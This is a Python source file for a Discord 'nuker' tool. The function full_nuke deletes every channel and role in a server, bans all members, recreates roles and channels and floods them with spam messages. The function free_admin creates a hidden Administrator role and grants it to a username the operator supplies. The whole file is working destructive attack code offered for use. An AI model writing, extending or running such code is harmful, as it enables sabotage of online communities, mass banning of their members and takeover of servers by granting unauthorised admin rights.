import discord
import asyncio
from colorama import Fore, Style
from utils import roles, members, spam, admin, invites, channels

async def full_nuke(guild):
    print(f"{Fore.RED}[-] Starting full nuke...{Style.RESET_ALL}")
    await asyncio.gather(
        channels.delete_channels(guild),
        roles.delete_roles(guild),
        members.ban_all_members(guild),
        roles.create_roles(guild),
        channels.create_channels(guild),
        spam.message_spammer(guild)
    )
    print(f"{Fore.LIGHTGREEN_EX}Full nuke completed.{Style.RESET_ALL}")

async def free_admin(guild):
    username = input(f"{Fore.LIGHTCYAN_EX}Enter username to give admin: {Style.RESET_ALL}")
    member = discord.utils.get(guild.members, name=username)

    if member:
        try:
            role = await guild.create_role(name="Administrator", permissions=discord.Permissions(administrator=True))
            await member.add_roles(role)
            print(f"{Fore.GREEN}[+] Admin role assigned to: {member.name}#{member.discriminator}{Style.RESET_ALL}")
        except discord.errors.Forbidden:
            print(f"{Fore.RED}Permission error while assigning admin role.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}User not found in guild.{Style.RESET_ALL}")
